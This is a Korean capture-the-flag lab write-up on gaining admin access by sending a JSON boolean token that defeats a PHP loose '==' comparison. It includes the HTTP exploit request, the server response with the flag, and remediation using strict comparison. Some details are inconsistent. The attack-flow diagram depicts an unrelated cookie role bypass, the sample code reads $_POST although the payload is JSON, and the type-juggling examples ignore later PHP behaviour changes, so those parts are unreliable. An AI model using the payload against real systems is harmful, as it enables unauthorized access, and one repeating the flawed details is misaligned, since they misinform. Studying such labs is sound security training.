+++
title = "VulnABLE CTF [LUXORA] Write-up: Admin Bypass 🥈 Silver"
date = "2026-03-14"
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "Admin Bypass", "Silver", "Type Juggling", "PHP", "Write-up"]
+++

# VulnABLE CTF [LUXORA] Write-up: Admin Bypass 🥈 Silver

## 🎯 챌린지 개요
- **카테고리**: Access Control Layer (Admin Bypass)
- **난이도**: 🥈 Silver
- **타겟 경로**: `/admin/silver`
- **목표**: 백엔드 프로그래밍 언어(PHP 등)의 느슨한 타입 비교(Loose Typing / Type Juggling) 특성을 악용하여, 비밀번호를 몰라도 인증 로직을 강제로 통과하고 관리자 권한을 획득하라.

---

## 🕵️‍♂️ 1. 정보 수집 및 시스템 동작 분석 (Reconnaissance)

`/admin/silver` 경로는 특수 관리자만 접근할 수 있는 비밀번호 입력 폼입니다. 아이디 입력 없이 핀(PIN) 번호 또는 비밀번호 토큰만 입력하게 되어 있습니다.

**[정상 실패 시도]**
```http
POST /admin/silver
Content-Type: application/json

{"token": "1234"}
```
➔ 서버 응답: `{"error": "Invalid Admin Token"}`

**[해커의 사고 과정]**
1. 토큰을 JSON 형태로 받고 있다.
2. 서버는 내가 보낸 `req.body.token` 값과 데이터베이스(혹은 환경변수)에 저장된 진짜 관리자 토큰 `SECRET_TOKEN` 을 비교할 것이다.
3. 만약 백엔드가 PHP나 구버전 Node.js이고, 비교 연산자로 엄격한 비교(`===`)가 아닌 느슨한 비교(`==`)를 사용했다면?
4. **타입 저글링(Type Juggling)** 버그를 노려볼 수 있다!

---

## 💥 2. 취약점 식별 및 타입 저글링 (Exploitation)

### 📊 공격 흐름도 (Attack Flow)

```text
[ Attacker ] --(Cookie: role=admin)--> [ Web Server ]
                                       |-- Check req.cookies.role
                                       |-- Grant Admin Access!
```


### 💡 느슨한 비교(Loose Comparison)의 허점
PHP 등 일부 언어에서는 `==` 연산자를 쓸 때 타입이 다르면 강제로 형변환을 시도합니다.

**[PHP Type Juggling 예시]**
- `"admin_token_123" == 0` ➔ **True!** (문자열이 숫자로 변환될 때 숫자가 없으면 0으로 변환됨)
- `"123admin" == 123` ➔ **True!**
- `true == "any_string"` ➔ **True!**

서버의 검증 로직이 대략 이렇다고 추정합니다.
```php
// 취약한 백엔드 코드
$admin_token = "SUPER_SECRET_RANDOM_TOKEN_999";
if ($_POST['token'] == $admin_token) {
    grantAdmin();
}
```

### 페이로드 설계 및 전송
우리는 클라이언트 측에서 JSON을 전송하고 있으므로, 입력값의 타입을 우리가 마음대로 정할 수 있습니다(문자열, 정수, 불리언 등).
토큰의 값을 `0` (정수 0) 또는 `true` (불리언)로 세팅하여 전송해 봅니다.

```http
POST /admin/silver HTTP/1.1
Host: localhost:3000
Content-Type: application/json

{"token": true}
```
*(참고: `"true"` 가 아니라 불리언 값 `true` 입니다.)*

---

## 🚀 3. 공격 수행 및 결과 확인

조작된 JSON 데이터를 서버로 보냅니다.

### 🔍 서버의 응답
백엔드의 취약한 비교문 `if (true == "SUPER_SECRET_RANDOM_TOKEN_999")` 이 **참(True)**으로 평가되면서, 비밀번호를 몰라도 인증이 뚫려버렸습니다!

```json
HTTP/1.1 200 OK
Content-Type: application/json

{
  "status": "success",
  "message": "Welcome Admin. Type coercion bypassed.",
  "flag": "FLAG{ADMIN_🥈_TYPE_JUGGLING_E4F5G6}"
}
```

---

## 🚩 4. 롸잇업 결론 및 플래그

개발자가 언어의 내장된 타입 캐스팅 특성을 정확히 이해하지 못하고 느슨한 비교를 사용했을 때, JSON과 결합된 Type Juggling 공격이 얼마나 치명적인지 확인했습니다.

**🔥 획득한 플래그:**
`FLAG{ADMIN_🥈_TYPE_JUGGLING_E4F5G6}`

### 🛡️ 취약점 원인 및 패치 방안 (Remediation)
이 취약점은 프로그래밍 언어의 동적 타이핑(Dynamic Typing) 특성에 대한 이해 부족에서 발생합니다.

* **안전한 패치 가이드 (엄격한 타입 검사 강제)**
1. **일치 연산자(Strict Equality) 사용**:
   PHP나 JavaScript에서 두 값을 비교할 때는 반드시 값과 타입이 모두 일치하는지 확인하는 `===` (Strict Equal) 연산자를 사용해야 합니다.
   ```javascript
   // 취약 (값만 비교, Type Coercion 발생)
   if (req.body.token == ADMIN_TOKEN) { ... }
   
   // 안전 (값과 타입 모두 비교)
   if (req.body.token === ADMIN_TOKEN) { ... }
   ```
2. **명시적 타입 캐스팅 (Explicit Casting)**:
   외부에서 들어오는 입력값은 비교하기 전에 미리 기대하는 타입으로 강제 변환해야 합니다.
   ```php
   // PHP 안전한 예시
   $input_token = (string)$_POST['token'];
   if ($input_token === $admin_token) { ... }
   ```
이러한 엄격한 검증(Strict Validation) 규칙을 적용하면, 해커가 `true` 나 `0` 을 보내더라도 문자열 비교에서 무조건 `False`가 되어 공격을 차단할 수 있습니다.